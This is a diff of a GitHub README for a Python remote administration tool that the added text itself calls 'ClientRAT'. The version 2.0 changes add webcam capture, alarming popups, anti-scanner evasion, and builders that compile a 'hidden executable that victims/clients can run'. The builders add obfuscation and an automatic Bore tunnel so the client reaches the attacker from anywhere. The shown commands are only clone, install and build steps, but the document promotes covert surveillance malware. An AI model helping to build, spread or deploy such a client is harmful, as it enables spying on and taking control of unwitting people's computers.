@@ -69,19 +69,34 @@ A **powerful** and **lightweight** Python-based remote administration tool that 
 <div align="center">
 
 | Feature | Description | Status |
+| Feature | Description | Status |
 |:-------:|:------------|:------:|
 | 🔌 | **TCP Communication** - Reliable client-server architecture | ✅ |
 | 👥 | **Multi-Client Support** - Manage multiple machines simultaneously | ✅ |
-| 💻 | **Dual Interface** - CLI and professional GUI options | ✅ |
-| 📸 | **4K Screenshots** - High-quality screen capture | ✅ |
+| 💻 | **Modular Architecture** - Thread-safe, multi-file codebase for UI, Network & Commands | ✅ |
+| 📸 | **4K Screenshots** - High-quality screen capture with dynamic compression | ✅ |
+| 📷 | **Webcam Capture** - Real-time webcam snapshot directly to GUI | ✅ |
 | 📁 | **File Transfer** - Upload/download with progress tracking | ✅ |
-| ⚙️ | **System Control** - Restart, shutdown, lock operations | ✅ |
-| 🎯 | **Process Management** - Find and terminate processes | ✅ |
-| 📊 | **Activity Logging** - Complete audit trail | ✅ |
-| ⌨️ | **Interactive Terminal** - Full keyboard shortcuts | ✅ |
-| 🌐 | **Cross-Platform** - Windows & Linux support | ✅ |
+| 💬 | **Cross-Platform Popups** - Native MessageBox, Zenity, or AppleScript popups | ✅ |
+| 🎯 | **OS-Specific Commands** - Advanced smart buttons that adapt to Windows/Linux/Mac | ✅ |
+| 🛡️ | **Anti-Scanner Protection** - Real-time socket probing and ghost connection rejection | ✅ |
+| ⌨️ | **Zero-Delay Terminal** - Fully interactive terminal with zero output latency | ✅ |
 
 </div>
+
+---
+
+## 🆕 What's New in v2.0?
+
+*   **Completely Modularized Backend:** `server_gui.py` is now backed by `gui_globals.py`, `gui_network.py`, `gui_features.py`, and `gui_commands.py` eliminating circular dependencies and UI freezes.
+*   **Webcam Support:** Capture images using the remote client's webcam (`opencv-python`).
+*   **Scary Native Popups:** Trigger native UI popups (Windows, macOS, Linux) with fallback support. Windows popups even trigger system sirens & TTS!
+*   **Zero-Delay Interactive Terminal:** Implemented `\n}` payload EOF markers so command output is rendered instantly with 0ms delay.
+*   **Advanced Anti-Scanner Protection:** Ghost TCP connections, port scanners, and older client executables are instantly purged.
+*   **Smarter Quick Commands:** Action buttons are dynamically generated based on the client's OS (Windows vs Linux vs Mac) and focus on advanced forensics (Firewalls, Scheduled Tasks, Memory Hogs).
+*   **Clean Process Kills:** Clicking "Disconnect" instantly and safely unloads the `.exe` from the client's RAM using hard `os._exit(0)`.
+
+---
 
 ---
 
@@ -98,8 +113,8 @@ A **powerful** and **lightweight** Python-based remote administration tool that 
 git clone https://github.com/palnirupam/Remote-admin-tool.git
 cd Remote-admin-tool
 
-# 2️⃣ Install dependencies (for GUI with screenshots)
-pip install pillow mss
+# 2️⃣ Install dependencies
+pip install -r requirements.txt
 
 # 3️⃣ Configure client IP in client.py
 # Edit SERVER_IP = "your_server_ip"
@@ -122,6 +137,37 @@ pip install pillow mss
    - **Remote**: Your public IP
 
 </details>
+
+### 🛠️ Building the Client Executable (.exe / Linux Binary)
+
+You can compile the `client.py` into a standalone, hidden executable that victims/clients can run without needing Python installed.
+*Note: If you run these build scripts on Windows, they generate a `.exe`. If you run them on Linux, they generate a native Linux executable.*
+
+#### 1️⃣ Basic Local Builder
+Use this if you are testing locally or already have your own port forwarding setup.
+```bash
+python build_client.py
+```
+*(Creates a standard `.exe` configured with whatever IP/Port is hardcoded in `client.py`)*
+
+#### 2️⃣ Global Access Auto-Builder (Recommended for WAN)
+Don't want to mess with router port forwarding or Ngrok? Use the advanced builder!
+It automatically sets up a free **Bore** tunnel and compiles your client into a standalone `.exe` that works anywhere on the internet.
+```bash
+python advanced_build.py
+```
+- Completely **FREE** (no accounts, cards, or passwords required)
+- Automatically downloads and configures the `bore` tunnel
+- Safely injects the public IP and Port to compile `ClientRAT_Global.exe`
+- Your original `client.py` stays safely configured for localhost!
+
+#### 3️⃣ Fast Builder (For Dev Testing)
+Use this if you are constantly testing and need a quick `.exe` compiled without extra obfuscation.
+```bash
+python fast_build.py
+```
+
+> **🎯 IMPORTANT:** Once the build process finishes successfully, your final `.exe` file will be located inside the **`dist`** folder within your project directory!
 
 ---
 
